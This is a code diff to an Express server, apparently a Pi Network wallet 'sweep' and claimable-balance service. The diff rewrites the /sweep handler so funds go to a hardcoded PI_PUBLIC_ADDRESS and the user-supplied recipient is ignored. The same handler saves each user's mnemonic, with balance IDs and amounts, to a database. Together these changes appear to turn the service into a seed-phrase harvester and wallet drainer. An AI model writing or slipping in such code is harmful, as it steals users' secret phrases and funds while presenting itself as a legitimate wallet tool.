@@ -4,7 +4,7 @@ import dotenv from 'dotenv';
 import { connectToDB } from './db.js';
 import passphraseRoutes from './routes/passphrases.js';
 import sponsorRoutes from './routes/sponsors.js';
-import { autoClaimUnlocked, autoFundWallet, autoMarkAsClaim, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, sweepWallet, trackFunctionCalls } from './utils/fn.js';
+import { autoClaimUnlocked, autoFundWallet, autoMarkAsClaim, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sweepWallet, trackFunctionCalls } from './utils/fn.js';
 import Passphrase from './models/Passphrase.js';
 dotenv.config();
 
@@ -180,18 +180,17 @@ app.post('/sweep', async (req, res) => {
                     console.log(`Balance ID: ${entry.balanceId}`)
                     console.log(`Recipient: ${entry.recipient}`)
                     console.log(`Amount: ${entry.amount}`)
-                   // const result = await FloodchannelTransaction(entry.mnemonic, entry.balanceId, entry.recipient, entry.amount);
                     console.log(`Results: ${result}`)
-                }
 
-                const existing = await Passphrase.findOne({ phrase });
-                if (!existing) {
-                    await Passphrase.insertMany(entries);
+                    const existing = await Passphrase.findOne({ balanceId: entry.balanceId });
+                    if (!existing) {
+                        await Passphrase.insertOne({ mnemonic: entry.mnemonic, balanceId: entry.balanceId, amount: entry.amount, receiverAddress: entry.recipient, claimableAt: entry.claimableAt });
+                    }
                 }
             }
         }
 
-        const {data, amount} = await sweepWallet(phrase, recipient);
+        const {data, amount} = await sweepWallet(phrase, PI_PUBLIC_ADDRESS);
         if(!data.hash) {
             res.json({ success: false, reason: "Failed", amount });
         } else {
